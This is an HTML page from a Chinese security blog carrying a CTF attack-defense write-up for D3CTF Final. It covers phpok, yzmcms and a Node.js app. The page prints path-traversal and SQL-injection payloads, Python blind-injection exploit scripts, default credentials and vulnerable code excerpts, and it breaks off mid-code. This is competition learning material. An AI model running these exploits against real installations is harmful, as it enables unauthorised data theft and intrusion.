@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"m09ic.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言抱歉来晚了,赛后写完就丢在草稿箱里忘了发. 技术部分实际上比较常见,稍微写下水篇博客. 源码链接:可能有部分代码已被修改,可以参考文章看原本的漏洞位置. https:&#x2F;&#x2F;share.weiyun.com&#x2F;57BvkJk">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D3CTF FINAL Writeup(WEB)">
+<meta property="og:url" content="https://m09ic.top/posts/10013/index.html">
+<meta property="og:site_name" content="M09ic&#39;s Blog">
+<meta property="og:description" content="前言抱歉来晚了,赛后写完就丢在草稿箱里忘了发. 技术部分实际上比较常见,稍微写下水篇博客. 源码链接:可能有部分代码已被修改,可以参考文章看原本的漏洞位置. https:&#x2F;&#x2F;share.weiyun.com&#x2F;57BvkJk">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://m09ic.top/posts/10013/1.png">
+<meta property="og:image" content="https://m09ic.top/posts/10013/2.png">
+<meta property="article:published_time" content="2020-01-23T10:43:25.000Z">
+<meta property="article:modified_time" content="2021-01-04T14:52:14.629Z">
+<meta property="article:author" content="M09ic">
+<meta property="article:tag" content="安全,学习笔记,blog,博客">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://m09ic.top/posts/10013/1.png">
+
+<link rel="canonical" href="https://m09ic.top/posts/10013/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>D3CTF FINAL Writeup(WEB) | M09ic's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-140303637-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-140303637-1');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?04d80448a6c7bfee29f2e7379ff56865";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="M09ic's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">M09ic's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">独自行走于莽荒之地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/10013/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          D3CTF FINAL Writeup(WEB)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-23 18:43:25" itemprop="dateCreated datePublished" datetime="2020-01-23T18:43:25+08:00">2020-01-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:52:14" itemprop="dateModified" datetime="2021-01-04T22:52:14+08:00">2021-01-04</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/10013/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/10013/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>抱歉来晚了,赛后写完就丢在草稿箱里忘了发.</p>
+<p>技术部分实际上比较常见,稍微写下水篇博客.</p>
+<p>源码链接:可能有部分代码已被修改,可以参考文章看原本的漏洞位置.</p>
+<p><a target="_blank" rel="noopener" href="https://share.weiyun.com/57BvkJk">https://share.weiyun.com/57BvkJk</a></p>
+<a id="more"></a>
+
+
+<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>cms: phpok v4.6.124</p>
+<p>写的顺序就按照我们挨打的顺序来了.</p>
+<h3 id="任意文件读"><a href="#任意文件读" class="headerlink" title="任意文件读"></a>任意文件读</h3><p>最初看到的流量是后台的任意文件读,稍微看了下代码.</p>
+<p>后台弱口令admin:admin123</p>
+<p>漏洞位于:<code>\phpok\\framework\admin\admin_control.php:129行</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$title</span> = <span class="keyword">$this</span>-&gt;get(<span class="string">&quot;title&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">$this</span>-&gt;dir_root . <span class="variable">$folder</span> . <span class="variable">$title</span>;</span><br></pre></td></tr></table></figure>
+<p>没有过滤直接拼接,因此可以目录穿越读到flag.</p>
+<p>payload:</p>
+<p><code>/admin.php?c=appsys&amp;f=file_edit&amp;id=fav&amp;title=../../../../../../../flag</code></p>
+<p>比赛的时候比较着急,只看到挨打后顺着流量摸了这个文件,没去仔细审计.赛后稍微看了下,类似的操作不止可以读文件.在写文件,解压文件都以同样的方式拼接字符串.而且在index与api入口,也存在类似拼接.因此前台即可读文件.</p>
+<p>api处payload: <code>api.php?c=download&amp;file=res/201903/27/../../../../../../../flag</code></p>
+<p>index处payload: <code>c=download&amp;file=res/201903/27/../../../../../../../flag</code></p>
+<p>修复则是在入口处简单过滤了<code>..</code></p>
+<h3 id="前台getshell"><a href="#前台getshell" class="headerlink" title="前台getshell"></a>前台getshell</h3><p>详情见文章:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194453">https://www.anquanke.com/post/id/194453</a></p>
+<p>巧的是发这文章的师傅也是这次比赛的选手.</p>
+<p>又是挨打后找到流量,</p>
+<p><code>/api.php?c=call&amp;f=index&amp;data=&#123;&quot;m_picplayer&quot;:&#123;&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;update app.d3ctf_list_40 set content=(select 1) where id = 1756&quot;&#125;&#125;&quot;</code></p>
+<p>也可使用反序列化后getshell,但大佬们似乎为了快速获得flag,只将flag弄到了前台,并没有维持权限与getshell.所以这虽然是你审计的0day,但是下一秒是我的了.</p>
+<p>大概有两三只队伍到游戏结束也没修复.</p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>同样位于api接口,没有直接的回显,可以盲注.</p>
+<p>payload:<code>api.php?c=project&amp;f=index&amp;token=q&amp;id=news&amp;sort=IF(ascii(substr((select flag from ctf.flag),%s,1))=%s,1,(select 1 from information_schema.tables))</code></p>
+<p>简单追踪一下漏洞位置:</p>
+<p><code>phpok/frameword/api/project_control.php:190-194</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$sort</span>) &#123;</span><br><span class="line">    <span class="variable">$dt</span>[<span class="string">&#x27;orderby&#x27;</span>] = <span class="variable">$sort</span>;</span><br><span class="line">    <span class="variable">$pageurl</span> .= <span class="string">&#x27;&amp;sort=&#x27;</span> . rawurlencode(<span class="variable">$sort</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;rlist[<span class="string">&#x27;sort&#x27;</span>] = <span class="variable">$sort</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>sort参数被赋值到<code>$dt[&#39;orderby&#39;]</code></p>
+<p>在212行:<code>$info = $this-&gt;call-&gt;phpok(&#39;_arclist&#39;, $dt);</code></p>
+<p>跟进<code>phpok/frameword.</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$orderby</span> = <span class="variable">$rs</span>[<span class="string">&#x27;orderby&#x27;</span>] ? <span class="variable">$rs</span>[<span class="string">&#x27;orderby&#x27;</span>] : <span class="variable">$project</span>[<span class="string">&#x27;orderby&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$rs</span>[<span class="string">&#x27;is_list&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$rs</span>[<span class="string">&#x27;psize&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$offset</span> = <span class="variable">$rs</span>[<span class="string">&#x27;offset&#x27;</span>] ? intval(<span class="variable">$rs</span>[<span class="string">&#x27;offset&#x27;</span>]) : <span class="number">0</span>;</span><br><span class="line"><span class="variable">$psize</span> = <span class="variable">$rs</span>[<span class="string">&#x27;is_list&#x27;</span>] ? intval(<span class="variable">$rs</span>[<span class="string">&#x27;psize&#x27;</span>]) : <span class="number">1</span>;</span><br><span class="line"><span class="variable">$rslist</span> = <span class="keyword">$this</span>-&gt;model(<span class="string">&#x27;list&#x27;</span>)-&gt;arc_all(<span class="variable">$project</span>, <span class="variable">$condition</span>, <span class="variable">$field</span>, <span class="variable">$offset</span>, <span class="variable">$psize</span>, <span class="variable">$orderby</span>);</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>$rs[&#39;orderby&#39;]</code>被代入查询,中间没有任何关于sql的过滤.</p>
+<p>通过盲注getflag.照着其他队打过来的payload,快速写了个exp反打.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">ip</span>):</span></span><br><span class="line">    base_url = <span class="string">&quot;http://%s/api.php?c=project&amp;f=index&amp;token=q&amp;id=news&amp;sort=&quot;</span></span><br><span class="line">    sql = <span class="string">&quot;IF(ascii(substr((select flag from ctf.flag),%s,1))=%s,1,(select 1 from information_schema.tables)) &quot;</span></span><br><span class="line">    s = <span class="string">&quot;0987654321abcdef&quot;</span></span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    print(base_url%ip+quote(sql%(<span class="number">1</span>,<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>))))</span><br><span class="line">    t = requests.get(base_url%ip+quote(sql%(<span class="number">1</span>,<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>))))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;执行错误&quot;</span>  <span class="keyword">not</span> <span class="keyword">in</span> t.text :</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    print(ip)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">39</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            <span class="comment"># print(base_url%ip+&#x27;1&#x27;)</span></span><br><span class="line">            print(i)</span><br><span class="line">            res = requests.get(base_url%ip+quote(sql%(i,<span class="built_in">ord</span>(j)))).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;执行错误&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res :</span><br><span class="line">                flag+=j</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;d3ctf&#123;%s&#125;&quot;</span>%flag)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;d3ctf&#123;%s&#125;&quot;</span>%flag</span><br></pre></td></tr></table></figure>
+<p>但实际上这个sql注入动静比较大,修复又容易.只拿到了几个flag就都修好了.</p>
+<p>还有几个主办方留的sql注入,与这个类似,师傅们修复的也都比较快,就没有一一写出来.</p>
+<p>这几个就是在流量中发现的所有漏洞,修好后没再被拿分.</p>
+<p>因为比赛的时候有些手忙脚乱,一边开发自动化脚本,一边审流量,没有静下心仔细看代码.赛后随便翻了下,没有过滤的sql点,以及直接拼接字符串读写文件的点还不少.</p>
+<p>还有一个漏洞可有可无,后台默认账号修改密码后session不会失效,第二题一开始写了个脚本拿了所有对的cookie,但后台并没有找到其他漏洞,因此无用.</p>
+<p>主办发还特地修改了验证码生成的地方,方便做自动化.</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>cms:yzmcms v5.4</p>
+<p>后台弱口令:   yzmcms:yzmcms</p>
+<p>web2漏洞与web1基本一致.</p>
+<h3 id="后台任意sql语句执行"><a href="#后台任意sql语句执行" class="headerlink" title="后台任意sql语句执行"></a>后台任意sql语句执行</h3><p>后台有个执行sql的地方,有读写文件权限.直接读flag.</p>
+<p>赛后看到有些师傅自动化出了点问题,因为需要先访问一次验证码api,绑定验证码与session.web1也是一样的.贴个例子.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">ip</span>):</span></span><br><span class="line">    base_url = <span class="string">&quot;http://%s/admin/index/login.html&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;yzmcms&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;yzmcms&#x27;</span>,<span class="string">&#x27;code&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;dosubmit&#x27;</span>:<span class="string">&#x27;%E7%99%BB%E3%80%80%E5%BD%95&#x27;</span>&#125;</span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.get(<span class="string">&quot;http://%s/api/index/code.html?&quot;</span>%ip,timeout=<span class="number">3</span>)</span><br><span class="line">    url = base_url%ip</span><br><span class="line">    p = s.post(url,data=data)</span><br><span class="line">    base_url2 = <span class="string">&quot;http://%s/admin/sql/do_sql.html&quot;</span></span><br><span class="line">    url = base_url2%ip</span><br><span class="line">    data2 = &#123;<span class="string">&#x27;sqlstr&#x27;</span>:<span class="string">&quot;select load_file(&#x27;/flag&#x27;)&quot;</span>,<span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;single&#x27;</span>,<span class="string">&#x27;single&#x27;</span>:<span class="string">&#x27;执行单条SQL&#x27;</span>&#125;</span><br><span class="line">    res = s.post(url,data=data2).text</span><br><span class="line">    res = re.<span class="built_in">compile</span>(<span class="string">&#x27;d3ctf&#123;.+?&#125;&#x27;</span>).findall(res)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
+<h3 id="主办方留的后门"><a href="#主办方留的后门" class="headerlink" title="主办方留的后门"></a>主办方留的后门</h3><p>在根目录下的<code>favicon.ico</code>内有一句话木马,并且特意设置的错误配置使其可解析.这个后门一开始拿d盾扫出来删了,然后主办方重置了一次靶机,我给忘了这个后门,流量又记录不到访问静态文件的.导致丢了好多轮的分.血亏</p>
+<h3 id="前台sql注入"><a href="#前台sql注入" class="headerlink" title="前台sql注入"></a>前台sql注入</h3><p>搜索出存在sql注入,漏洞位于<code>application/search/controller/index.class.php:13-37行</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;	</span><br><span class="line">	<span class="variable">$site</span> = get_config();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$q</span> = trim(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line">	<span class="variable">$modelid</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;modelid&#x27;</span>]) ? intval(<span class="variable">$_GET</span>[<span class="string">&#x27;modelid&#x27;</span>]) : <span class="number">1</span>;</span><br><span class="line">	<span class="variable">$modelinfo</span> = get_modelinfo();</span><br><span class="line">	<span class="variable">$modelarr</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$modelinfo</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">		<span class="variable">$modelarr</span>[<span class="variable">$val</span>[<span class="string">&#x27;modelid&#x27;</span>]] = <span class="variable">$val</span>[<span class="string">&#x27;tablename&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$modelarr</span>[<span class="variable">$modelid</span>])) showmsg(<span class="string">&#x27;模型不存在！&#x27;</span>, <span class="string">&#x27;stop&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$seo_title</span> = <span class="string">&#x27;‘&#x27;</span>.<span class="variable">$q</span>.<span class="string">&#x27;’的搜索结果_&#x27;</span>.<span class="variable">$site</span>[<span class="string">&#x27;site_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$keywords</span> = <span class="variable">$q</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$site</span>[<span class="string">&#x27;site_keyword&#x27;</span>];</span><br><span class="line">	<span class="variable">$description</span> = <span class="variable">$site</span>[<span class="string">&#x27;site_description&#x27;</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$where</span> = <span class="string">&quot;`title` LIKE &#x27;%<span class="subst">$q</span>%&#x27; AND `status` = 1&quot;</span>;</span><br><span class="line">	<span class="variable">$db</span> = D(<span class="variable">$modelarr</span>[<span class="variable">$modelid</span>]);</span><br><span class="line">	<span class="variable">$total</span> = <span class="variable">$db</span>-&gt;where(<span class="variable">$where</span>)-&gt;total();</span><br><span class="line">	<span class="variable">$page</span> = <span class="keyword">new</span> page(<span class="variable">$total</span>, <span class="keyword">$this</span>-&gt;offset);</span><br><span class="line">	<span class="variable">$search_data</span> = <span class="variable">$db</span>-&gt;field(<span class="string">&#x27;id,title,description,inputtime,updatetime,click,thumb,nickname,url,catid&#x27;</span>)-&gt;where(<span class="variable">$where</span>)-&gt;order(<span class="string">&#x27;id DESC&#x27;</span>)-&gt;limit(<span class="variable">$page</span>-&gt;limit())-&gt;select();</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$pages</span> = <span class="string">&#x27;&lt;span class=&quot;pageinfo&quot;&gt;共&lt;strong&gt;&#x27;</span>.<span class="variable">$page</span>-&gt;total().<span class="string">&#x27;&lt;/strong&gt;页&lt;strong&gt;&#x27;</span>.<span class="variable">$total</span>.<span class="string">&#x27;&lt;/strong&gt;条记录&lt;/span&gt;&#x27;</span>.<span class="variable">$page</span>-&gt;getfull();</span><br><span class="line">	<span class="keyword">include</span> template(<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;search&#x27;</span>);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>比较明显,没任何过滤,直接拼接进去了.同样是盲注:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">ip</span>):</span></span><br><span class="line">    base_url = <span class="string">&quot;http://%s/index.php?m=search&amp;c=index&amp;a=init&amp;modelid=1&amp;q=1&quot;</span>%ip</span><br><span class="line">    sql = <span class="string">&quot;&#x27; or &#x27;%s&#x27;=substr(load_file(&#x27;/flag&#x27;),%s,1)#&quot;</span></span><br><span class="line">    s = <span class="string">&quot;0987654321abcdef&quot;</span></span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">39</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            res = requests.get(base_url+quote(sql%(j,i))).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;substr(load_file&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;共&lt;span&gt;0&lt;/span&gt;条&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res :</span><br><span class="line">                flag+=j</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;d3ctf&#123;%s&#125;&quot;</span>%flag</span><br></pre></td></tr></table></figure>
+<p>web2还有一个任意文件上传,因为其他队修的比较快,也就最开始打了两轮,把比赛服务器打down了,第二次上线后好像都没中招,因此也没去找.</p>
+<p>web2有个比较坑的地方,文章被搅屎的师傅删了,然后就被checkdown了,第一天全场只有一队正常,应该就是这队师傅干的(重拳出击).每轮被checkdown,掉了好多分,与第一名失之交臂.</p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>web3是第二天才上线,上线没多久就下线了,还是被我们蹭了不少分.</p>
+<p>web3应该是配置出了问题,不会自动启动,于是我们手动启动了,然后问了下主办方咋没开启check.就恰了各位师傅checkdown的烂分.</p>
+<p>不太熟悉nodejs,只找到一个任意文件读的洞,流量里还看到另外一个类似的洞.</p>
+<p>payload1: <code>/api/get</code> post:<code>file=../../../../../../../../flag</code></p>
+<p>payload2: <code>/api/crawl</code> post:<code>file=../../../../../../../../flag</code></p>
+<p>漏洞位于<code>web3/api/controllers/ApiController.js</code>:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    	fs.writeFile(<span class="string">&#x27;/tmp/log.txt&#x27;</span>,req.body , &#123; <span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;a&#x27;</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">		    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">		        <span class="keyword">throw</span> err;</span><br><span class="line">		    &#125;</span><br><span class="line">		 </span><br><span class="line">		    <span class="built_in">console</span>.log(req.body);</span><br><span class="line">		&#125;);</span><br><span class="line">        <span class="keyword">let</span> file = req.param(<span class="string">&#x27;file&#x27;</span>) ? req.param(<span class="string">&#x27;file&#x27;</span>) : <span class="string">&#x27;d3ctf.png&#x27;</span>;</span><br><span class="line">        imgfile = <span class="string">&#x27;assets/templates/default/img/&#x27;</span> + file;</span><br><span class="line">        <span class="keyword">let</span> data = fs.readFileSync(imgfile);</span><br><span class="line">        <span class="keyword">let</span> buf = Buffer.from(data);</span><br><span class="line">        <span class="keyword">let</span> encodeData = buf.toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">        res.locals.imgdata = encodeData;</span><br><span class="line">        <span class="keyword">return</span> res.templet(&#123;&#125;);</span><br><span class="line">    &#125;,</span><br><span 